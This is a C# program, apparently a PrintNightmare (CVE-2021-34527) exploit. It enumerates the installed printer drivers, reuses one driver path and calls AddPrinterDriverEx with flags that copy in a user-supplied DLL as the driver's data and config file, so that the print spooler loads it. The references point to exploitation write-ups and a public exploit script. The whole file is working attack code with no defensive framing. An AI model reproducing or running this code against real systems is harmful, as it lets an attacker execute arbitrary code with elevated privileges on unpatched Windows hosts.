using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Load_PrintDriver
{
    public class Program
    {
        // driver-info-2 struct
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct _DRIVER_INFO_2
        {
            public uint cVersion;
            public string pName;
            public string pEnvironment;
            public string pDriverPath;
            public string pDataFile;
            public string pConfigFile;
        }

        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern int AddPrinterDriverEx(string pName, uint level, ref _DRIVER_INFO_2 driverInfoStruct, uint dwFileCopyFlags);

        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool GetPrinterDriverDirectory(string pName, string pEnvironment, uint Level, StringBuilder pDriverDirectory, uint cbBuf, out uint pcbNeeded);

        [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool EnumPrinterDrivers(string pName, string pEnvironment, uint Level, IntPtr pDriverInfo, uint cbBuf,  out uint pcbNeeded, out uint pcReturned);

        public static void Main(string[] args)
        {
            /*
             * References:
             * 1. https://learn.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex
             * 2. https://learn.microsoft.com/en-us/windows/win32/printdocs/driver-info-2
             * 3. https://itm4n.github.io/printnightmare-exploitation/
             * 4. https://hidocohen.medium.com/understanding-printnightmare-vulnerability-cf4f1e0e506c
             * 5. https://github.com/JohnHammond/CVE-2021-34527/blob/master/CVE-2021-34527.ps1
             * 6. https://learn.microsoft.com/en-us/windows/win32/printdocs/getprinterdriverdirectory
             * 7. https://learn.microsoft.com/en-us/windows/win32/printdocs/enumprinterdrivers
             */

            // Build driver info struct:
            _DRIVER_INFO_2 driverInfo = new _DRIVER_INFO_2();
            driverInfo.cVersion = 3;
            driverInfo.pName = "PNTest Printer Driver";
            driverInfo.pEnvironment = "Windows x64";
            driverInfo.pDataFile = args[0].ToString();
            driverInfo.pConfigFile = args[0].ToString();

            // Get the Printer Driver Directory:
            uint bufSize = 512;
            StringBuilder buffer = new StringBuilder((int)bufSize);
            uint pcbNeeded;
            GetPrinterDriverDirectory(null, "Windows x64", 1, buffer, 260, out pcbNeeded);
            Console.WriteLine("[+] Printer Driver Directory location for Windows x64: " + buffer);

            // Get the number of drivers in order to create the size of array needed for driverInfo structs:
            IntPtr testInfo = IntPtr.Zero;
            uint pcbN = 0;
            uint pcbR = 0;
            EnumPrinterDrivers(null, "Windows x64", 2, testInfo, 0, out pcbN, out pcbR);
            int errorW = Marshal.GetLastWin32Error();
            if (errorW != 122)
            {
                Console.WriteLine("[-] Got error other than ERROR_INSUFFICIENT_BUFFER: " + errorW);
                Environment.Exit(1);
            }
            Console.WriteLine("[!] Size of buffer needed to contain array of structs returned from EnumPrinterDrivers: " + pcbN);

            // Populate a _DRIVER_INFO_2 struct:
            uint New_pcbN = 0;
            uint New_pcbR = 0;
            uint sizeOfBuf = pcbN;
            IntPtr pDrvInfo = Marshal.AllocHGlobal((int)sizeOfBuf);
            if (!EnumPrinterDrivers(null, "Windows x64", 2, pDrvInfo, pcbN, out New_pcbN, out New_pcbR))
            {
                Console.WriteLine("[-] Got error calling EnumPrinterDrivers a second time: " + Marshal.GetLastWin32Error());
                Environment.Exit(1);
            }
            _DRIVER_INFO_2[] driverToUse = new _DRIVER_INFO_2[New_pcbR];
            int sizeOfCurrentStruct = Marshal.SizeOf(typeof(_DRIVER_INFO_2));
            for (int i = 0; i < New_pcbR; i++)
            {
                driverToUse[i] = (_DRIVER_INFO_2)Marshal.PtrToStructure(pDrvInfo, typeof(_DRIVER_INFO_2));
                pDrvInfo = IntPtr.Add(pDrvInfo, sizeOfCurrentStruct);
            }
                        
            // Access array and populate pDriverPath for passing to AddPrinterDriverEx:
            try
            {
                driverInfo.pDriverPath = driverToUse[0].pDriverPath;
                Console.WriteLine($"[+] Driver path to pass to AddPrinterDriverEx: {driverInfo.pDriverPath}");
            } catch {
                Console.WriteLine("[-] Could not populate driverInfo.pDriverPath???");
                Marshal.FreeHGlobal(pDrvInfo);
                Environment.Exit(0);
            }

            // Create flags to pass to AddPrinterDriverEx:
            const uint APD_COPY_ALL_FILES = 0x00000004;
            const uint APD_COPY_FROM_DIRECTORY = 0x00000010;
            const uint APD_INSTALL_WARNED_DRIVER = 0x00008000;
            uint flags = APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER;

            // Call AddPrinterDriverEx:
            if (AddPrinterDriverEx(null, 2, ref driverInfo, flags) == 0)
            {
                Console.WriteLine("[-] Error calling AddPrinterDriverEx: " + Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(pDrvInfo);
                Environment.Exit(1);
            }

            Console.WriteLine("[+] Success?");
            Marshal.FreeHGlobal(pDrvInfo);
        }
    }
}
